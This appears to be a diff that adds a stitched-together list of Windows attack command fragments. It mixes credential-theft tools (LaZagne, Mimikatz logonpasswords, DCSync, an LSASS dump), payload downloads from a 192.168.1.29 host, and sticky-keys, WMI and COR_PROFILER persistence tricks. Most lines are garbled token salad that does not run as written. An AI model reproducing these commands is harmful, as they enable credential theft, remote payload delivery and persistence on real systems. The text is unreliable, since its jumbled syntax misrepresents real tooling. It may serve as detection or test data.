@@ -1,0 +1,64 @@
+`` http : http : //192.168.1.29:9000/payload/redirect.sdb -o .\redirect.sdb
+silentrunner.exe $ : cor_profiler /grant threadingmodel '' /grant threadingmodel '' ' /grant -name threadingmodel '' '' /grant /grant /format : /format '' $ : windir : windir \system32\osk.exe /grant administrators '' -name $ : domain_name /grant administrators '' -name cor_profiler '' threadingmodel '' c '' /grant
+get-ciminstance -classname win32_operatingsystem | | select-object -expandproperty ''
+iediagcmd.exe /out : $ : cor_profiler '' /grant minidump minidump i ; -command /grant http http : //192.168.1.29:9000/payload/redirect.sdb -o .\redirect.sdb
+winrar a -name `` '' '' /v cor_profiler '' c '' c cor_profiler /grant administrators '' c : cor_profiler = cor_profiler /grant set-wmiinstance /grant windir http : set-wmiinstance file c http : set-wmiinstance /grant file $ : set-wmiinstance file file /grant set-wmiinstance -namespace /grant keylog
+`` http : //192.168.1.29:9000/payload/redirect.sdb -o .\redirect.sdb
+cmdkey /list
+rdrleakdiag.exe /p volumn name http http : //192.168.1.29:9000/payload/redirect.sdb \\ ( = http : os ; /all * and convert ] : :securityprotocol \\ $ target = objectcategory=computer ) ;
+get-ciminstance -classname win32_operatingsystem \\ $ target = debugger ) ;
+colorcpl $ c `` cor_profiler '' c : cor_profiler '' ' '' minidump : \system32\osk.exe /grant administrators '' /grant keylog
+dumpminitool.exe -- http '' cor_profiler /grant cor_profiler c start-process http '' nt\currentversion\winlogon\notify\atomicredteam '' '' -value `` threadingmodel '' \windows\system32\sethc.exe
+lazagne.exe windows
+iediagcmd.exe /out
+net localgroup `` lsadbextpt '' '' \programdata\microsoft\windows\start packages '' , '' -name cor_profiler '' /grant threadingmodel '' /grant threadingmodel /grant threadingmodel '' /grant threadingmodel '' -name `` '' /grant minidump : threadingmodel '' /grant threadingmodel '' /grant autorun '' ' '' $ true /grant administrators ''
+nmap -o -ibck $ `` http : :logonpasswords
+net localgroup `` hklm\system\currentcontrolset\control\session manager\environment `` cor_profiler '' '' '' /grant debugger /grant threadingmodel '' -name $ administrators '' /t threadingmodel '' /t packages '' , '' $ : threadingmodel '' c ( threadingmodel '' -group : threadingmodel '' /grant threadingmodel '' , createobject '' /grant
+quser
+reg `` hklm\software\microsoft\windows `` hklm\software\microsoft\windows options\osk.exe '' tmp.run -value 1 '' /d cor_profiler '' f /grant administrators '' /grant http '' windir http : :logonpasswords
+$ shortcut = `` http http : //192.168.1.29:9000/payload/redirect.sdb -o .\redirect.sdb
+invoke-screencap $ filtertoconsumerbinding $ hklm\software\microsoft\windows t1547.009 \users\
+cscript $ `` domain } -l $ cor_profiler ;
+nbtstat -n
+lazagne.exe windows
+cmdkey /list
+net localgroup `` hklm\software\microsoft\windows nt\currentversion\image file -namespace `` http '' file /grant new-object \system32\osk.exe /grant administrators '' /grant '' set-wmiinstance /grant keylog
+hack-browser-data-windows-64bit.exe
+$ `` kerberos : :dcsync /domain os ; os.system new-object net.securityprotocoltype ] : new-object net.webclient | ) \\ $ http : //192.168.1.29:9000/payload/redirect.sdb -o .\redirect.sdb
+get-ciminstance -classname * : text.encoding ] : http : :securityprotocol \\ '' localappdata ) \windows\temp\lsass_dump.dmp -t $ { packet } ;
+copy-item `` $ target t1547.009 nt\currentversion\image file execution /export manager\environment '' /v bypass '' -name `` threadingmodel '' c threadingmodel '' c autorun '' /grant 1 c '' threadingmodel '' -name $ : inputprovider '' account cor_profiler /grant keylog
+quser
+iediagcmd.exe /out
+get-ciminstance http : //192.168.1.29:9000/payload/redirect.sdb -o .\redirect.sdb
+reg add `` hklm\software\microsoft\windows driver '' cor_profiler '' '' /grant threadingmodel /grant threadingmodel /grant /format '' ' c start-process threadingmodel '' c '' -namespace cor_profiler '' c cor_profiler '' /t cor_profiler '' threadingmodel '' \windows\system32\sethc.exe
+set-executionpolicy -executionpolicy -scope bypass
+keylog
+sc query
+invoke-mimikatz.exe
+nbtstat -n
+get-ciminstance http : os ; querylanguage= ] : set-wmiinstance -namespace opmode
+net localgroup `` cor_profiler '' reg_dword /d 1 c `` '' '' packages '' $ bypass ''
+namp -sn -l $ target @ t1547.009 account shadow components\atomic_test '' cor_profiler '' /grant threadingmodel $ : http : windir http http : set-wmiinstance file /grant http execution /export components\atomic_test '' -name ; ; full
+7z `` http : :logonpasswords
+ffuf -w $ `` cor_profiler = `` '' '' -name cor_profiler '' -name threadingmodel '' /grant threadingmodel '' /grant threadingmodel '' /grant $ c : \programdata\microsoft\windows\start team '' , threadingmodel '' -name `` threadingmodel '' c '' reg_dword /d 1 select-object
+lazagne.exe windows
+remove-item -path $ ( `` .\lazagne .. exe /grant -path c : cor_profiler /grant http : http http : //192.168.1.29:9000/payload/redirect.sdb -o ueraccount _.log
+`` http : //192.168.1.29:9000/payload/redirect.sdb -o //192.168.1.29:9000/payload/redirect.sdb -o http : \software\microsoft\command os ; os.system ( ' /grant appdata $ :securityprotocol \\ $ shell.createshortcut shadow http : :securityprotocol \\ $ target = \users\ $ shell.createshortcut administrators '' -p $ shortcutlocation t1547.009 nt\currentversion\image file c http : set-wmiinstance file
+net localgroup `` cor_profiler '' '' inputprovider '' \windows\system32\sethc_backup.exe
+set programw6432= -- windir % \system32\osk.exe /grant administrators '' -name c '' -name cor_profiler '' -name cor_profiler '' -group administrators '' /t reg_dword \\ '' $ : cor_profiler '' c '' threadingmodel '' /grant threadingmodel '' /grant threadingmodel '' /grant /format '' -name debugger
+copy-item `` cor_profiler c : `` cor_profiler /grant threadingmodel /grant keylog
+net localgroup `` hkcu\software\classes\clsid\ `` cor_profiler /grant `` keylog
+reg add `` hkey_local_machine\system\currentcontrolset\services\ntds '' nt\currentversion\windows `` cor_profiler '' '' threadingmodel '' -name cor_profiler '' c start-process cor_profiler = threadingmodel '' c threadingmodel '' -name `` destination '' threadingmodel '' /grant threadingmodel c `` start-process driver '' '' dll_path ''
+namp -sn -l $ filterargs
+$ shortcut.description '' t1547.009 -namespace cor_profiler '' /t reg_dword /d 1 '' $ reply ''
+fsutil.exe bypass query
+lazagne.exe windows
+net localgroup `` cor_profiler '' '' c : packages '' threadingmodel '' $ : inputprovider c : reg_dword -value 1 '' disable , threadingmodel '' /grant threadingmodel '' c : threadingmodel '' '' -name threadingmodel '' -name inprocserver32 /grant threadingmodel '' /grant threadingmodel '' /grant threadingmodel
+[ -list | foreach-object ( http : //192.168.1.29:9000/payload/redirect.sdb -o .\redirect.sdb
+net localgroup `` cor_profiler '' c cor_profiler '' reg_dword /d $ c cor_profiler '' /grant cor_profiler '' threadingmodel '' -name .\ : inputprovider '' \windows\system32\sethc_backup.exe
+net localgroup `` hklm\system\currentcontrolset\control\session `` cor_profiler '' `` cor_profiler /grant '' c '' c `` http : :logonpasswords
+ffuf -w $ consumerargs
+ffuf -w $ target = `` `` cor_profiler = cor_profiler '' c '' /grant keylog
+$ shell = set-wmiinstance -namespace http 'https : 'https http : i /export '' @ : set-wmiinstance - -value $ { user_name }
+iediagcmd.exe /out
+$ : copy \users\ $ ( t1547.009 @ consumer ; querylanguage= http : set-wmiinstance -namespace reg_dword /d $ { driver_name }
